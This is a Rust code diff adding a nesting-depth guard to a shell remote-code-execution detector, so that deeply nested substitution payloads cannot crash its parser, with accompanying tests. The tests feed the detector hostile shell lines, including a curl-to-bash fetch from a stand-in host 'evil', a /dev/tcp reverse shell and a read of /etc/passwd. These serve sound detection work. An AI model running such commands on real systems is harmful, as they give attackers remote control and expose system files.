@@ -1018,6 +1018,18 @@ const SHELL_AST_MAX_INPUT_BYTES: usize = 2048;
 /// boundary, never a panic (the walk simply stops descending).
 const SHELL_WALK_MAX_DEPTH: usize = 32;
 
+/// Maximum nesting depth of shell recursion-driving delimiters that may be handed
+/// to the brush-parser tokenizer. `brush-parser`'s recursive-descent **tokenizer**
+/// has no internal depth bound, so a deeply nested `$( … )` / `$(( … ))` /
+/// `{ … }` / backtick payload drives unbounded recursion and overflows the worker's
+/// (2 MiB) thread stack *during lexing* — earlier than [`SHELL_WALK_MAX_DEPTH`]
+/// (a post-parse walk bound) or [`SHELL_AST_MAX_INPUT_BYTES`] (a byte cap) can help,
+/// and a Rust stack overflow aborts the process (`catch_unwind` cannot intercept it).
+/// Measured overflow onset is ~150–170 nested `$(`; this bound sits far below it so a
+/// too-deep payload is *declined before any brush-parser call* (the structural
+/// [`RceStructuralDetector`] still inspects the field — the request is not degraded).
+const SHELL_MAX_NESTING_DEPTH: usize = 20;
+
 /// Maximum number of per-word command-substitution re-parses in one detector
 /// invocation. Bounds the extra [`shell_word::parse`] work a wide command line can
 /// trigger; beyond it, later words are not sub-parsed for `$(…)` / backtick
@@ -1332,6 +1344,14 @@ impl SemanticDetector for RceAstDetector {
         if !shell_ast_prefilter(s) {
             return None;
         }
+        // Stack-overflow guard (P0 DoS): brush-parser's recursive-descent tokenizer
+        // has no depth bound, so decline a payload whose delimiter nesting could
+        // overflow the worker stack *before* handing it to `tokenize_str`. A Rust
+        // stack overflow aborts the process and cannot be caught, so this must be a
+        // pre-parse reject; the structural detector still inspects the field.
+        if max_nesting_depth(s) > SHELL_MAX_NESTING_DEPTH {
+            return None;
+        }
         // DoS budget: one attempt + input bytes, shared with the SQL AST layer.
         if !state.try_take_ast_attempt() {
             return None;
@@ -1390,6 +1410,40 @@ fn shell_ast_prefilter(s: &str) -> bool {
         || s.contains(" -e")
         || s.contains("/etc/")
         || s.contains("/proc/")
+}
+
+/// Cheap single-pass scan of the maximum number of *concurrently unclosed*
+/// recursion-driving shell delimiters in `s` — the stack-overflow protection for
+/// the AST parse (plan §8, P0 `DoS`). Tracks, and returns the running maximum sum of:
+/// - parentheses (`(` … `)`) — covers `$( … )` command substitution, `( … )`
+///   subshells, `$(( … ))` / `(( … ))` arithmetic, and `<( … )` / `>( … )` process
+///   substitution (every one opens with a `(`);
+/// - brace groups (`{ … }`) — covers `${ … }` parameter expansion and `{ …; }`;
+/// - backtick command substitution (`` ` … ` ``) — paired by toggling.
+///
+/// Deliberately quote- and escape-agnostic: a conservative *over*-count only causes
+/// an early decline (safe — the structural detector still runs), never a missed
+/// parse. Pure, no allocation, no brush-parser call.
+fn max_nesting_depth(s: &str) -> usize {
+    let mut paren: usize = 0;
+    let mut brace: usize = 0;
+    let mut backtick: usize = 0;
+    let mut max_depth: usize = 0;
+    for b in s.bytes() {
+        match b {
+            b'(' => paren += 1,
+            b')' => paren = paren.saturating_sub(1),
+            b'{' => brace += 1,
+            b'}' => brace = brace.saturating_sub(1),
+            b'`' => backtick ^= 1,
+            _ => continue,
+        }
+        let depth = paren + brace + backtick;
+        if depth > max_depth {
+            max_depth = depth;
+        }
+    }
+    max_depth
 }
 
 /// Walk every complete command of a parsed program.
@@ -2705,5 +2759,109 @@ mod tests {
     fn rce_ast_oversized_input_is_declined() {
         let big = format!("bash -c '{}'", "a".repeat(SHELL_AST_MAX_INPUT_BYTES));
         assert!(rce_ast_fire(&big).is_none(), "oversized view is not AST-inspected");
+    }
+
+    // ── P0: shell-AST stack-overflow DoS guard (nested substitution) ─────────
+
+    /// A deeply nested `$( … )` payload must be **declined before** the tokenizer,
+    /// never crash. The raw `brush_parser::tokenize_str` overflows the worker's
+    /// (2 MiB) stack at ~n=170 nested `$(` and aborts the process (SIGABRT) — which
+    /// no `catch_unwind` can intercept. That this test *returns* (no abort) is the
+    /// proof the guard rejects the input before any brush-parser call. n=682 fills
+    /// the byte cap; both must decline.
+    #[test]
+    fn rce_ast_nested_substitution_declines_without_stack_overflow() {
+        for n in [170usize, 682usize] {
+            let payload = format!("a{}{}", "$(".repeat(n), ")".repeat(n));
+            assert!(payload.len() <= SHELL_AST_MAX_INPUT_BYTES, "n={n} within byte cap");
+            assert!(
+                rce_ast_fire(&payload).is_none(),
+                "n={n}: over-nested payload must be declined (guard), not parsed"
+            );
+        }
+    }
+
+    #[test]
+    fn max_nesting_depth_counts_each_delimiter_form() {
+        // Each recursion-driving delimiter form, nested to depth 3.
+        assert_eq!(max_nesting_depth("a$($($(x)))"), 3, "dollar-paren");
+        assert_eq!(max_nesting_depth("(((x)))"), 3, "subshell paren");
+        assert_eq!(max_nesting_depth("${${${x}}}"), 3, "parameter expansion brace");
+        assert_eq!(max_nesting_depth("{ { { x } } }"), 3, "brace group");
+        assert_eq!(max_nesting_depth("<(<(<(x)))"), 3, "process substitution");
+        // Arithmetic `$((` opens two parens per level.
+        assert_eq!(max_nesting_depth("$(( 1 + 2 ))"), 2, "arithmetic doubles paren");
+        // A single backtick pair toggles between 0 and 1.
+        assert_eq!(max_nesting_depth("echo `id`"), 1, "backtick pair");
+        assert_eq!(max_nesting_depth("plain text no delims"), 0, "no delimiters");
+    }
+
+    #[test]
+    fn max_nesting_depth_resets_after_close_and_mixes_forms() {
+        // Closed-then-reopened: depth returns to the shallow reopened level, not the sum.
+        assert_eq!(max_nesting_depth("$($(x)) $($(y))"), 2, "reopen resets, not cumulative");
+        // Mixed paren + brace + backtick are summed while concurrently open.
+        assert_eq!(max_nesting_depth("$( ${ `x` } )"), 3, "mixed forms sum");
+        // Unbalanced closers floor at zero (never underflow / wrap).
+        assert_eq!(max_nesting_depth(")))abc"), 0, "leading closers floor at zero");
+    }
+
+    #[test]
+    fn rce_ast_nesting_boundary_at_threshold() {
+        // Exactly at the threshold is admitted by the guard (depth == 20 is allowed);
+        // one deeper is declined. Use `$(` nesting so it also exercises the tokenizer
+        // path at depth 20 without crashing (well below the ~150 overflow onset).
+        let at = format!(
+            "a{}{}",
+            "$(".repeat(SHELL_MAX_NESTING_DEPTH),
+            ")".repeat(SHELL_MAX_NESTING_DEPTH)
+        );
+        assert_eq!(max_nesting_depth(&at), SHELL_MAX_NESTING_DEPTH);
+        // Guard admits depth==20 (does not early-decline); parsing it must not abort.
+        let _ = rce_ast_fire(&at);
+        let over = format!(
+            "a{}{}",
+            "$(".repeat(SHELL_MAX_NESTING_DEPTH + 1),
+            ")".repeat(SHELL_MAX_NESTING_DEPTH + 1)
+        );
+        assert_eq!(max_nesting_depth(&over), SHELL_MAX_NESTING_DEPTH + 1);
+        assert!(rce_ast_fire(&over).is_none(), "depth 21 declined by guard");
+    }
+
+    #[test]
+    fn rce_ast_shallow_nesting_still_fires_after_guard() {
+        // Regression red-line: the guard must not suppress genuine shallow-nesting
+        // catches. Each of these has nesting depth well under the threshold.
+        assert!(max_nesting_depth("bash <<EOF\nid\nEOF\n") <= SHELL_MAX_NESTING_DEPTH);
+        assert_eq!(
+            rce_ast_fire("bash <<EOF\nid\ncat /etc/passwd\nEOF\n")
+                .expect("here-doc → interpreter still fires")
+                .rule_key,
+            "rce_ast.heredoc_interp"
+        );
+        assert_eq!(
+            rce_ast_fire("bash -c id").expect("bash -c still fires").rule_key,
+            "rce_ast.interp_exec_flag"
+        );
+        assert_eq!(
+            rce_ast_fire("echo $(id)").expect("shallow $() still fires").rule_key,
+            "rce_ast.cmd_subst"
+        );
+        assert_eq!(
+            rce_ast_fire("echo `whoami`").expect("backtick still fires").rule_key,
+            "rce_ast.cmd_subst"
+        );
+        assert_eq!(
+            rce_ast_fire("curl http://evil/x | bash")
+                .expect("pipe→interp still fires")
+                .rule_key,
+            "rce_ast.pipe_to_interp"
+        );
+        assert_eq!(
+            rce_ast_fire("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
+                .expect("reverse shell still fires")
+                .rule_key,
+            "rce_ast.reverse_shell"
+        );
     }
 }
